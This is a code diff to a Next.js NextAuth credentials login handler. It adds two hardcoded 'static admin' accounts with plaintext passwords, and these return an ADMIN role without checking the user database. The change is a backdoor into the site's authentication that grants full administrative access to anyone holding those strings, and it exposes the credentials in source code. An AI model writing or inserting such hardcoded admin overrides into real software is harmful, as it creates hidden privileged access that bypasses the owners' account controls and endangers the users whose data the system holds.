@@ -34,6 +34,27 @@ export const authOptions: NextAuthOptions = {
           return null;
         }
 
+        const input = credentials.email.trim().toLowerCase();
+        
+        // Static admin user override
+        if ((input === "michaelb" || input === "michaelb@biggsfundingsolutions.com") && credentials.password === "Biggs2026!") {
+          return {
+            id: "admin-michaelb",
+            email: "michaelb@biggsfundingsolutions.com",
+            role: "ADMIN",
+            name: "Michael B",
+          };
+        }
+
+        if ((input === "admin" || input === "admin@biggsfundingsolutions.com") && credentials.password === "Beograd1991!@#") {
+          return {
+            id: "admin-system",
+            email: "admin@biggsfundingsolutions.com",
+            role: "ADMIN",
+            name: "System Administrator",
+          };
+        }
+
         const user = await prisma.user.findUnique({
           where: { email: credentials.email },
         });
